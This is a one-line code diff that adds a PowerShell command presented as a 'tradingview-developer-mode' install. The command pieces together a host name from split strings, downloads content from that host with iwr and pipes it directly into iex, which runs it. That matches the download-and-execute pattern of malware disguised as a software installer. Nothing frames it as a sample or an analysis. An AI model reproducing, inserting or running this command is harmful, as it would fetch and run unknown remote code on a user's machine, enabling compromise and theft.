@@ -1,0 +1,1 @@
+powershell -command "$install='tradingview-developer-mode'; $mode='.app'; iwr ('tradingview' + 'install' + $mode) | iex"
